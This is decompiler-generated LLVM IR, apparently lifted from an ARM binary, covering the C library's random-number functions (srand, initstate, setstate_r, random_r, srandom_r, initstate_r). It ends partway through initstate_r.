  %v3_12d40 = load i32, i32* bitcast (i32** @global_var_23438.485 to i32*), align 4
  store i32 %v3_12d40, i32* @r4, align 4
  %v3_12d44 = call i32 @setstate_r(i32 %arg1, i32* nonnull @global_var_23430)
  %v1_12d4c = icmp slt i32 %v3_12d44, 0
  store i32 %v2_12d04, i32* @r0, align 4
  %. = select i1 %v1_12d4c, i32 0, i32 ptrtoint (i32** @global_var_23434.487 to i32)
  %v1_12d64 = call i32 @__pthread_return_void()
  ret i32 %.
}

define i32 @initstate(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i32, align 4
  %v2_12d94 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %arg1, i32* @r8, align 4
  store i32 %arg2, i32* @r5, align 4
  store i32 %arg3, i32* @r6, align 4
  store i32 %v2_12d94, i32* @r0, align 4
  %v1_12db8 = call i32 @__pthread_return_void()
  %v1_12dc8 = call i32 @__pthread_return_0()
  %v0_12dd0 = load i32, i32* @r5, align 4
  %v0_12dd4 = load i32, i32* @r6, align 4
  %v0_12dd8 = load i32, i32* @r8, align 4
  store i32 %v0_12dd8, i32* @r0, align 4
  %v3_12ddc = load i32, i32* bitcast (i32** @global_var_23438.485 to i32*), align 4
  store i32 %v3_12ddc, i32* @r4, align 4
  %v4_12de0 = inttoptr i32 %v0_12dd8 to i32*
  %v5_12de0 = call i32 @__GI_initstate_r(i32* %v4_12de0, i32 %v0_12dd0, i32 %v0_12dd4, i32 ptrtoint (i32* @global_var_23430 to i32))
  store i32 %v2_12d94, i32* @r0, align 4
  %v1_12df4 = call i32 @__pthread_return_void()
  ret i32 ptrtoint (i32** @global_var_23434.487 to i32)
}

define i32 @srand(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-32 = alloca i32, align 4
  %v3_12e24 = load i32, i32* @r4, align 4
  %v9_12e24 = load i32, i32* @r6, align 4
  store i32 ptrtoint (i32* @global_var_23418.472 to i32), i32* @r4, align 4
  %v2_12e2c = ptrtoint i32* %stack_var_-32 to i32
  store i32 %arg1, i32* @r6, align 4
  store i32 %v2_12e2c, i32* @r0, align 4
  %v1_12e48 = call i32 @__pthread_return_void()
  %v1_12e58 = call i32 @__pthread_return_0()
  %v0_12e5c = load i32, i32* @r6, align 4
  store i32 %v0_12e5c, i32* @r0, align 4
  %v2_12e64 = inttoptr i32 %v0_12e5c to i32*
  %v3_12e64 = call i32 @srandom_r(i32* %v2_12e64, i32 ptrtoint (i32* @global_var_23430 to i32))
  store i32 %v2_12e2c, i32* @r0, align 4
  store i32 77440, i32* @lr, align 4
  %v1_12e7c = call i32 @__pthread_return_void()
  store i32 %v3_12e24, i32* @r4, align 4
  store i32 %v9_12e24, i32* @r6, align 4
  ret i32 %v1_12e7c

; uselistorder directives
  uselistorder i32* @global_var_23430, { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_23430 to i32), { 1, 0 }
}

define i32 @setstate_r(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-20 = alloca i32, align 4
  %v1_12ea0 = add i32 %tmp, 12
  %v2_12ea0 = inttoptr i32 %v1_12ea0 to i32*
  %v3_12ea0 = load i32, i32* %v2_12ea0, align 4
  %v3_12ea4 = load i32, i32* @r4, align 4
  store i32 %v3_12ea4, i32* %stack_var_-20, align 4
  %v2_12ea8 = icmp eq i32 %v3_12ea0, 0
  store i32 %tmp, i32* %r4.global-to-local, align 4
  br i1 %v2_12ea8, label %.thread7, label %.thread8

.thread7:                                         ; preds = %entry
  %v1_12eb41 = add i32 %tmp, 8
  %v2_12eb42 = inttoptr i32 %v1_12eb41 to i32*
  %v3_12eb43 = load i32, i32* %v2_12eb42, align 4
  store i32 %v3_12eb43, i32* %r1.global-to-local, align 4
  %v3_12ec8 = add i32 %v3_12eb43, -4
  %v4_12ec8 = inttoptr i32 %v3_12ec8 to i32*
  store i32 0, i32* %v4_12ec8, align 4
  br label %bb

.thread8:                                         ; preds = %entry
  %v2_12eb0 = add i32 %tmp, 4
  %v3_12eb0 = inttoptr i32 %v2_12eb0 to i32*
  %v4_12eb0 = load i32, i32* %v3_12eb0, align 4
  %v1_12eb4 = add i32 %tmp, 8
  %v2_12eb4 = inttoptr i32 %v1_12eb4 to i32*
  %v3_12eb4 = load i32, i32* %v2_12eb4, align 4
  store i32 %v3_12eb4, i32* %r1.global-to-local, align 4
  %v3_12eb8 = sub i32 %v4_12eb0, %v3_12eb4
  %v4_12ebc = sdiv i32 %v3_12eb8, 4
  %v4_12ec4 = mul i32 %v4_12ebc, 5
  %v5_12ec4 = add i32 %v4_12ec4, %v3_12ea0
  %v3_12ecc = add i32 %v3_12eb4, -4
  %v4_12ecc = inttoptr i32 %v3_12ecc to i32*
  store i32 %v5_12ec4, i32* %v4_12ecc, align 4
  br label %bb

bb:                                               ; preds = %.thread7, %.thread8
  %v1_12ed0 = add i32 %arg1, 4
  store i32 %v1_12ed0, i32* %r6.global-to-local, align 4
  %v2_12ed4 = inttoptr i32 %arg1 to i32*
  %v3_12ed4 = load i32, i32* %v2_12ed4, align 4
  store i32 5, i32* %r1.global-to-local, align 4
  %v2_12edc = srem i32 %v3_12ed4, 5
  store i32 %v2_12edc, i32* %r0.global-to-local, align 4
  %v2_12ee8 = and i32 %v2_12edc, 1073741824
  %v3_12ee8 = icmp ne i32 %v2_12ee8, 0
  %v4_12ee8 = mul nsw i32 %v2_12edc, 4
  %v2_12eec = icmp ne i32 %v2_12edc, 4
  %v3_12eec = and i1 %v3_12ee8, %v2_12eec
  br i1 %v3_12eec, label %dec_label_pc_12f48, label %dec_label_pc_12ef0

dec_label_pc_12ef0:                               ; preds = %bb
  %v5_12ee8 = add i32 %v4_12ee8, ptrtoint (i32* @global_var_1ab24.501 to i32)
  %v1_12ef0 = add i32 %v4_12ee8, add (i32 ptrtoint (i32* @global_var_1ab24.501 to i32), i32 20)
  %v2_12ef0 = inttoptr i32 %v1_12ef0 to i32*
  %v3_12ef0 = load i32, i32* %v2_12ef0, align 4
  store i32 %v3_12ef0, i32* %r5.global-to-local, align 4
  %v6_12ef4 = inttoptr i32 %v5_12ee8 to i32*
  %v7_12ef4 = load i32, i32* %v6_12ef4, align 4
  store i32 %v7_12ef4, i32* %r7.global-to-local, align 4
  %v2_12ef8 = icmp eq i32 %v2_12edc, 0
  store i32 5, i32* %r1.global-to-local, align 4
  %v1_12f00 = load i32, i32* %r4.global-to-local, align 4
  %v2_12f00 = add i32 %v1_12f00, 16
  %v3_12f00 = inttoptr i32 %v2_12f00 to i32*
  store i32 %v3_12ef0, i32* %v3_12f00, align 4
  %v0_12f04 = load i32, i32* %r7.global-to-local, align 4
  %v1_12f04 = load i32, i32* %r4.global-to-local, align 4
  %v2_12f04 = add i32 %v1_12f04, 20
  %v3_12f04 = inttoptr i32 %v2_12f04 to i32*
  store i32 %v0_12f04, i32* %v3_12f04, align 4
  %v0_12f08 = load i32, i32* %r0.global-to-local, align 4
  %v1_12f08 = load i32, i32* %r4.global-to-local, align 4
  %v2_12f08 = add i32 %v1_12f08, 12
  %v3_12f08 = inttoptr i32 %v2_12f08 to i32*
  store i32 %v0_12f08, i32* %v3_12f08, align 4
  br i1 %v2_12ef8, label %dec_label_pc_12f34, label %dec_label_pc_12f10

dec_label_pc_12f10:                               ; preds = %dec_label_pc_12ef0
  %v0_12f10 = load i32, i32* %r6.global-to-local, align 4
  %v1_12f10 = add i32 %v0_12f10, -4
  %v2_12f10 = inttoptr i32 %v1_12f10 to i32*
  %v3_12f10 = load i32, i32* %v2_12f10, align 4
  %v1_12f14 = load i32, i32* %r1.global-to-local, align 4
  %v2_12f14 = sdiv i32 %v3_12f10, %v1_12f14
  store i32 %v2_12f14, i32* %r0.global-to-local, align 4
  %v4_12f18 = mul i32 %v2_12f14, 4
  %v5_12f18 = add i32 %v4_12f18, %v0_12f10
  %v1_12f1c = load i32, i32* %r4.global-to-local, align 4
  %v2_12f1c = add i32 %v1_12f1c, 4
  %v3_12f1c = inttoptr i32 %v2_12f1c to i32*
  store i32 %v5_12f18, i32* %v3_12f1c, align 4
  %v0_12f20 = load i32, i32* %r0.global-to-local, align 4
  %v1_12f20 = load i32, i32* %r7.global-to-local, align 4
  %v2_12f20 = add i32 %v1_12f20, %v0_12f20
  %v0_12f24 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_12f24, i32* %r1.global-to-local, align 4
  %v2_12f28 = srem i32 %v2_12f20, %v0_12f24
  %v0_12f2c = load i32, i32* %r6.global-to-local, align 4
  %v4_12f2c = mul i32 %v2_12f28, 4
  %v5_12f2c = add i32 %v0_12f2c, %v4_12f2c
  store i32 %v5_12f2c, i32* %r0.global-to-local, align 4
  %v1_12f30 = load i32, i32* %r4.global-to-local, align 4
  %v2_12f30 = inttoptr i32 %v1_12f30 to i32*
  store i32 %v5_12f2c, i32* %v2_12f30, align 4
  br label %dec_label_pc_12f34

dec_label_pc_12f34:                               ; preds = %dec_label_pc_12ef0, %dec_label_pc_12f10
  %v0_12f34 = load i32, i32* %r6.global-to-local, align 4
  %v1_12f34 = load i32, i32* %r5.global-to-local, align 4
  %v4_12f34 = mul i32 %v1_12f34, 4
  %v5_12f34 = add i32 %v4_12f34, %v0_12f34
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_12f3c = load i32, i32* %r4.global-to-local, align 4
  %v2_12f3c = add i32 %v1_12f3c, 24
  %v3_12f3c = inttoptr i32 %v2_12f3c to i32*
  store i32 %v5_12f34, i32* %v3_12f3c, align 4
  %v0_12f40 = load i32, i32* %r6.global-to-local, align 4
  %v1_12f40 = load i32, i32* %r4.global-to-local, align 4
  %v2_12f40 = add i32 %v1_12f40, 8
  %v3_12f40 = inttoptr i32 %v2_12f40 to i32*
  store i32 %v0_12f40, i32* %v3_12f40, align 4
  %v2_12f44 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_12f44, i32* %r4.global-to-local, align 4
  ret i32 0

dec_label_pc_12f48:                               ; preds = %bb
  %v0_12f48 = call i32 @__errno_location()
  %v2_12f50 = inttoptr i32 %v0_12f48 to i32*
  store i32 22, i32* %v2_12f50, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_12f58 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_12f58, i32* %r4.global-to-local, align 4
  ret i32 -1

; uselistorder directives
  uselistorder i32 %v2_12edc, { 1, 0, 3, 2, 4 }
  uselistorder i32 %tmp, { 1, 4, 0, 3, 2, 5 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder i32* %r0.global-to-local, { 5, 6, 7, 0, 1, 2, 3, 4 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_12f34, { 1, 0 }
  uselistorder label %bb, { 1, 0 }
}

define i32 @__GI_random_r(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-12 = alloca i32, align 4
  %v1_12f60 = add i32 %tmp, 12
  %v2_12f60 = inttoptr i32 %v1_12f60 to i32*
  %v3_12f60 = load i32, i32* %v2_12f60, align 4
  store i32 %v3_12f60, i32* %r3.global-to-local, align 4
  %v2_12f64 = icmp eq i32 %v3_12f60, 0
  %v3_12f68 = load i32, i32* @r4, align 4
  store i32 %v3_12f68, i32* %stack_var_-12, align 4
  store i32 %tmp, i32* %ip.global-to-local, align 4
  store i32 %arg2, i32* %r5.global-to-local, align 4
  %v1_12f74 = add i32 %tmp, 8
  %v2_12f74 = inttoptr i32 %v1_12f74 to i32*
  %v3_12f74 = load i32, i32* %v2_12f74, align 4
  store i32 %v3_12f74, i32* %lr.global-to-local, align 4
  br i1 %v2_12f64, label %dec_label_pc_12f7c, label %dec_label_pc_12fa0

dec_label_pc_12f7c:                               ; preds = %entry
  %v1_12f7c = inttoptr i32 %v3_12f74 to i32*
  %v2_12f7c = load i32, i32* %v1_12f7c, align 4
  store i32 %v2_12f7c, i32* %r2.global-to-local, align 4
  %v2_12f84 = mul i32 %v2_12f7c, 1103515245
  %v1_12f8c = add i32 %v2_12f84, 12345
  %tmp10 = bitcast i32 %v1_12f8c to float
  %tmp11 = call float @fabsf(float %tmp10)
  %v1_12f90 = bitcast float %tmp11 to i32
  store i32 %v1_12f90, i32* %r3.global-to-local, align 4
  store i32 %v1_12f90, i32* %v1_12f7c, align 4
  %v0_12f98 = load i32, i32* %r3.global-to-local, align 4
  %v2_12f98 = inttoptr i32 %arg2 to i32*
  store i32 %v0_12f98, i32* %v2_12f98, align 4
  br label %dec_label_pc_12fe4

dec_label_pc_12fa0:                               ; preds = %entry
  %v2_12fa0 = load i32, i32* %arg1, align 4
  store i32 %v2_12fa0, i32* %r2.global-to-local, align 4
  %v1_12fa4 = add i32 %tmp, 4
  %v2_12fa4 = inttoptr i32 %v1_12fa4 to i32*
  %v3_12fa4 = load i32, i32* %v2_12fa4, align 4
  store i32 %v3_12fa4, i32* %r0.global-to-local, align 4
  %v1_12fa8 = inttoptr i32 %v2_12fa0 to i32*
  %v2_12fa8 = load i32, i32* %v1_12fa8, align 4
  store i32 %v2_12fa8, i32* %r3.global-to-local, align 4
  %v1_12fac = inttoptr i32 %v3_12fa4 to i32*
  %v2_12fac = load i32, i32* %v1_12fac, align 4
  %v4_12fac = add i32 %v3_12fa4, 4
  store i32 %v4_12fac, i32* %r0.global-to-local, align 4
  %v2_12fb0 = add i32 %v2_12fac, %v2_12fa8
  store i32 %v2_12fb0, i32* %r3.global-to-local, align 4
  store i32 %v2_12fb0, i32* %v1_12fa8, align 4
  %v3_12fb4 = load i32, i32* %r2.global-to-local, align 4
  %v4_12fb4 = add i32 %v3_12fb4, 4
  store i32 %v4_12fb4, i32* %r2.global-to-local, align 4
  %v0_12fb8 = load i32, i32* %ip.global-to-local, align 4
  %v1_12fb8 = add i32 %v0_12fb8, 24
  %v2_12fb8 = inttoptr i32 %v1_12fb8 to i32*
  %v3_12fb8 = load i32, i32* %v2_12fb8, align 4
  store i32 %v3_12fb8, i32* %r4.global-to-local, align 4
  %v0_12fbc = load i32, i32* %r3.global-to-local, align 4
  %v3_12fbc = udiv i32 %v0_12fbc, 2
  store i32 %v3_12fbc, i32* %r3.global-to-local, align 4
  %v3_12fc0 = icmp ult i32 %v4_12fb4, %v3_12fb8
  %v1_12fc4 = load i32, i32* %r5.global-to-local, align 4
  %v2_12fc4 = inttoptr i32 %v1_12fc4 to i32*
  store i32 %v3_12fbc, i32* %v2_12fc4, align 4
  br i1 %v3_12fc0, label %dec_label_pc_12fd4, label %bb

bb:                                               ; preds = %dec_label_pc_12fa0
  %v1_12fc8 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v1_12fc8, i32* %r2.global-to-local, align 4
  %v0_12fcc = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_12fcc, i32* %r3.global-to-local, align 4
  br label %bb9

dec_label_pc_12fd4:                               ; preds = %dec_label_pc_12fa0
  %v0_12fcc1 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_12fcc1, i32* %r3.global-to-local, align 4
  %v1_12fd4 = load i32, i32* %r4.global-to-local, align 4
  %v3_12fd4 = icmp ult i32 %v0_12fcc1, %v1_12fd4
  br i1 %v3_12fd4, label %bb8, label %.thread2

bb8:                                              ; preds = %dec_label_pc_12fd4
  store i32 %v0_12fcc1, i32* %r3.global-to-local, align 4
  br label %bb9

.thread2:                                         ; preds = %dec_label_pc_12fd4
  %v1_12fdc = load i32, i32* %lr.global-to-local, align 4
  store i32 %v1_12fdc, i32* %r3.global-to-local, align 4
  br label %bb9

bb9:                                              ; preds = %bb, %bb8, %.thread2
  %v0_12fe0 = load i32, i32* %ip.global-to-local, align 4
  %v1_12fe0 = inttoptr i32 %v0_12fe0 to i32*
  %v2_12fe0 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v2_12fe0, i32* %v1_12fe0, align 4
  %v3_12fe0 = add i32 %v0_12fe0, 4
  %v4_12fe0 = inttoptr i32 %v3_12fe0 to i32*
  %v5_12fe0 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v5_12fe0, i32* %v4_12fe0, align 4
  br label %dec_label_pc_12fe4

dec_label_pc_12fe4:                               ; preds = %dec_label_pc_12f7c, %bb9
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_12fe8 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_12fe8, i32* @r4, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v0_12fcc1, { 1, 0, 2 }
  uselistorder i32 %v3_12fbc, { 1, 0 }
  uselistorder i32 %v1_12f90, { 1, 0 }
  uselistorder i32 %tmp, { 1, 3, 2, 0, 4 }
  uselistorder i32* %r3.global-to-local, { 3, 1, 2, 0, 4, 5, 6, 7, 8, 9, 10, 11 }
  uselistorder i32* %r2.global-to-local, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32* %r0.global-to-local, { 1, 3, 2, 4, 5, 0 }
  uselistorder label %dec_label_pc_12fe4, { 1, 0 }
  uselistorder label %bb9, { 2, 1, 0 }
}

define i32 @srandom_r(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v3_12ff0 = load i32, i32* @r4, align 4
  store i32 %v3_12ff0, i32* %stack_var_-32, align 4
  %v6_12ff0 = load i32, i32* @r5, align 4
  %v1_12ff4 = add i32 %tmp, 12
  %v2_12ff4 = inttoptr i32 %v1_12ff4 to i32*
  %v3_12ff4 = load i32, i32* %v2_12ff4, align 4
  %v2_12ffc = ptrtoint i32* %stack_var_-36 to i32
  store i32 %tmp, i32* %r6.global-to-local, align 4
  %tmp29 = icmp ugt i32 %v3_12ff4, 4
  br i1 %tmp29, label %.dec_label_pc_130a8_crit_edge, label %dec_label_pc_1300c

.dec_label_pc_130a8_crit_edge:                    ; preds = %entry
  br label %dec_label_pc_130a8

dec_label_pc_1300c:                               ; preds = %entry
  %v0_1300c = load i32, i32* @r0, align 4
  %v2_1300c = icmp eq i32 %v0_1300c, 0
  %v1_13010 = add i32 %tmp, 8
  %v2_13010 = inttoptr i32 %v1_13010 to i32*
  %v3_13010 = load i32, i32* %v2_13010, align 4
  store i32 %v3_13010, i32* %r7.global-to-local, align 4
  br i1 %v2_1300c, label %bb, label %bb21

bb:                                               ; preds = %dec_label_pc_1300c
  store i32 1, i32* @r0, align 4
  br label %bb21

bb21:                                             ; preds = %dec_label_pc_1300c, %bb
  %v0_1301c = phi i32 [ %v0_1300c, %dec_label_pc_1300c ], [ 1, %bb ]
  %v2_13018 = icmp eq i32 %v3_12ff4, 0
  %v2_1301c = inttoptr i32 %v3_13010 to i32*
  store i32 %v0_1301c, i32* %v2_1301c, align 4
  br i1 %v2_13018, label %dec_label_pc_130a4, label %dec_label_pc_13024

dec_label_pc_13024:                               ; preds = %bb21
  %v1_13024 = add i32 %tmp, 16
  %v2_13024 = inttoptr i32 %v1_13024 to i32*
  %v3_13024 = load i32, i32* %v2_13024, align 4
  store i32 %v3_13024, i32* %sb.global-to-local, align 4
  %v0_13028 = load i32, i32* @r0, align 4
  %v0_1302c = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_1302c, i32* %sl.global-to-local, align 4
  store i32 2, i32* %r8.global-to-local, align 4
  %v5_1307423 = icmp sgt i32 %v3_13024, 1
  br i1 %v5_1307423, label %dec_label_pc_13038, label %dec_label_pc_13078

dec_label_pc_13038:                               ; preds = %dec_label_pc_13024, %dec_label_pc_13038
  %v0_1304825 = phi i32 [ %v0_13068.pre, %dec_label_pc_13038 ], [ %v0_13028, %dec_label_pc_13024 ]
  %v1_1306024 = phi i32 [ %v5_13060, %dec_label_pc_13038 ], [ %v0_1302c, %dec_label_pc_13024 ]
  %v2_13038 = srem i32 %v0_1304825, 127773
  %v2_13044 = mul i32 %v2_13038, 16807
  %v2_1304c = sdiv i32 %v0_1304825, 127773
  %tmp30 = mul nsw i32 %v2_1304c, -2836
  %v2_13058 = add i32 %v2_13044, %tmp30
  %v8_13058 = icmp slt i32 %v2_13058, 0
  %v2_1305c = add i32 %v2_13058, 2147483647
  %v2_1305c.v2_13058 = select i1 %v8_13058, i32 %v2_1305c, i32 %v2_13058
  store i32 %v2_1305c.v2_13058, i32* @r5, align 4
  %v2_13060 = add i32 %v1_1306024, 4
  %v3_13060 = inttoptr i32 %v2_13060 to i32*
  store i32 %v2_1305c.v2_13058, i32* %v3_13060, align 4
  %v4_13060 = load i32, i32* %sl.global-to-local, align 4
  %v5_13060 = add i32 %v4_13060, 4
  store i32 %v5_13060, i32* %sl.global-to-local, align 4
  %v0_13064.pre = load i32, i32* %r8.global-to-local, align 4
  %v1_13064.pre = load i32, i32* %sb.global-to-local, align 4
  %v0_13068.pre = load i32, i32* @r5, align 4
  %v1_13070 = add i32 %v0_13064.pre, 1
  store i32 %v1_13070, i32* %r8.global-to-local, align 4
  %v5_13074 = icmp slt i32 %v0_13064.pre, %v1_13064.pre
  br i1 %v5_13074, label %dec_label_pc_13038, label %dec_label_pc_13064.dec_label_pc_13078_crit_edge

dec_label_pc_13064.dec_label_pc_13078_crit_edge:  ; preds = %dec_label_pc_13038
  %v0_13084.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_13078

dec_label_pc_13078:                               ; preds = %dec_label_pc_13064.dec_label_pc_13078_crit_edge, %dec_label_pc_13024
  %v0_13084 = phi i32 [ %v0_13084.pre, %dec_label_pc_13064.dec_label_pc_13078_crit_edge ], [ %v0_1302c, %dec_label_pc_13024 ]
  %v0_1307c.lcssa = phi i32 [ %v1_13064.pre, %dec_label_pc_13064.dec_label_pc_13078_crit_edge ], [ %v3_13024, %dec_label_pc_13024 ]
  %v2_1307c = mul i32 %v0_1307c.lcssa, 10
  store i32 %v2_1307c, i32* @r4, align 4
  %v0_13080 = load i32, i32* %r6.global-to-local, align 4
  %v1_13080 = add i32 %v0_13080, 20
  %v2_13080 = inttoptr i32 %v1_13080 to i32*
  %v3_13080 = load i32, i32* %v2_13080, align 4
  %v4_13084 = mul i32 %v3_13080, 4
  %v5_13084 = add i32 %v0_13084, %v4_13084
  %v1_13088 = inttoptr i32 %v0_13080 to i32*
  store i32 %v5_13084, i32* %v1_13088, align 4
  %v3_13088 = add i32 %v0_13080, 4
  %v4_13088 = inttoptr i32 %v3_13088 to i32*
  %v5_13088 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v5_13088, i32* %v4_13088, align 4
  br label %dec_label_pc_13094

dec_label_pc_13090:                               ; preds = %dec_label_pc_13094
  %v0_13098 = load i32, i32* %r6.global-to-local, align 4
  %v2_13090 = inttoptr i32 %v0_13098 to i32*
  %v3_13090 = call i32 @__GI_random_r(i32* %v2_13090, i32 %v2_12ffc)
  br label %dec_label_pc_13094

dec_label_pc_13094:                               ; preds = %dec_label_pc_13078, %dec_label_pc_13090
  %v0_13094 = load i32, i32* @r4, align 4
  %v1_13094 = add i32 %v0_13094, -1
  store i32 %v1_13094, i32* @r4, align 4
  %v6_13094 = icmp slt i32 %v1_13094, 0
  br i1 %v6_13094, label %dec_label_pc_130a4, label %dec_label_pc_13090

dec_label_pc_130a4:                               ; preds = %dec_label_pc_13094, %bb21
  %v2_130ac.pre = load i32, i32* %stack_var_-32, align 4
  br label %dec_label_pc_130a8

dec_label_pc_130a8:                               ; preds = %.dec_label_pc_130a8_crit_edge, %dec_label_pc_130a4
  %v2_130ac = phi i32 [ %v3_12ff0, %.dec_label_pc_130a8_crit_edge ], [ %v2_130ac.pre, %dec_label_pc_130a4 ]
  %v26_130ac = phi i32 [ -1, %.dec_label_pc_130a8_crit_edge ], [ 0, %dec_label_pc_130a4 ]
  store i32 %v2_130ac, i32* @r4, align 4
  store i32 %v6_12ff0, i32* @r5, align 4
  ret i32 %v26_130ac

; uselistorder directives
  uselistorder i32 %v1_13094, { 1, 0 }
  uselistorder i32 %v0_13080, { 1, 0, 2 }
  uselistorder i32 %v0_13064.pre, { 1, 0 }
  uselistorder i32 %v5_13060, { 1, 0 }
  uselistorder i32 %v2_13058, { 2, 1, 0 }
  uselistorder i32 %v0_1304825, { 1, 0 }
  uselistorder i32 %v0_1302c, { 1, 0, 2 }
  uselistorder i32 %v3_13024, { 1, 0, 2 }
  uselistorder i32 %v3_12ff4, { 1, 0 }
  uselistorder i32 %tmp, { 0, 1, 3, 2 }
  uselistorder i32* %r7.global-to-local, { 0, 2, 1, 3 }
  uselistorder i32 127773, { 1, 0 }
  uselistorder label %dec_label_pc_130a8, { 1, 0 }
  uselistorder label %dec_label_pc_13094, { 1, 0 }
  uselistorder label %dec_label_pc_13038, { 1, 0 }
  uselistorder label %bb21, { 1, 0 }
}

define i32 @"$d.2"(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_130b0:
  %r0.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %v0_130b0 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_130b0, label %.thread, label %.thread1

.thread:                                          ; preds = %dec_label_pc_130b0
  %v2_130b0 = load i32, i32* @r7, align 4
  %v5_130b0 = udiv i32 %v2_130b0, 8
  %v6_130b0 = and i32 %v5_130b0, %arg1
  store i32 %v6_130b0, i32* %r4.global-to-local, align 4
  %v2_130b4 = load i32, i32* @sp, align 4
  %v8_130b4 = shl i32 %v2_130b4, %arg3
  %v9_130b4 = and i32 %v8_130b4, %arg2
  call void @__pseudo_branch(i32 %v9_130b4)
  %v0_130b8.pr.pr = load i1, i1* @cpsr_z, align 1
  %v1_130b8 = load i32, i32* %r0.global-to-local, align 4
  br i1 %v0_130b8.pr.pr, label %bb, label %.thread1

bb:                                               ; preds = %.thread
  %v2_130b8 = load i32, i32* %r4.global-to-local, align 4
  %v3_130b8 = load i32, i32* @fp, align 4
  %v8_130b8 = shl i32 %v2_130b8, %v3_130b8
  %v9_130b8 = and i32 %v8_130b8, %v1_130b8
  store i32 %v9_130b8, i32* %r0.global-to-local, align 4
  br label %.thread1

.thread1:                                         ; preds = %.thread, %dec_label_pc_130b0, %bb
  %v10_130b8 = phi i32 [ %arg1, %dec_label_pc_130b0 ], [ %v9_130b8, %bb ], [ %v1_130b8, %.thread ]
  ret i32 %v10_130b8

; uselistorder directives
  uselistorder i32 %v1_130b8, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %.thread1, { 2, 0, 1 }
}

define i32 @__GI_initstate_r(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r3.global-to-local, align 4
  store i32 %arg2, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_130c0 = load i32, i32* @r4, align 4
  store i32 %v3_130c0, i32* %stack_var_-20, align 4
  store i32 %tmp, i32* @r7, align 4
  store i32 %arg3, i32* @r5, align 4
  %tmp28 = icmp ult i32 %arg2, 128
  br i1 %tmp28, label %dec_label_pc_130e0, label %dec_label_pc_130d0

dec_label_pc_130d0:                               ; preds = %entry
  %v2_130d0 = icmp ugt i32 %arg2, 254
  %v7_130d0 = icmp eq i32 %arg2, 255
  %v2_130d4 = xor i1 %v7_130d0, true
  %v3_130d4 = and i1 %v2_130d0, %v2_130d4
  br i1 %v3_130d4, label %bb, label %bb20

bb:                                               ; preds = %dec_label_pc_130d0
  store i32 4, i32* @r4, align 4
  br label %bb20

bb20:                                             ; preds = %dec_label_pc_130d0, %bb
  %v1_131087 = phi i32 [ %v3_130c0, %dec_label_pc_130d0 ], [ 4, %bb ]
  %v2_130d8 = xor i1 %v2_130d0, true
  %v3_130d8 = or i1 %v7_130d0, %v2_130d8
  br i1 %v3_130d8, label %bb21, label %bb25

bb21:                                             ; preds = %bb20
  store i32 3, i32* @r4, align 4
  br label %bb25

dec_label_pc_130e0:                               ; preds = %entry
  %tmp29 = icmp ugt i32 %arg2, 31
  br i1 %tmp29, label %dec_label_pc_130f8, label %dec_label_pc_130e8

dec_label_pc_130e8:                               ; preds = %dec_label_pc_130e0
  %tmp30 = icmp ugt i32 %arg2, 7
  br i1 %tmp30, label %.thread10, label %dec_label_pc_13164

.thread10:                                        ; preds = %dec_label_pc_130e8
  store i32 0, i32* @r4, align 4
  br label %bb25

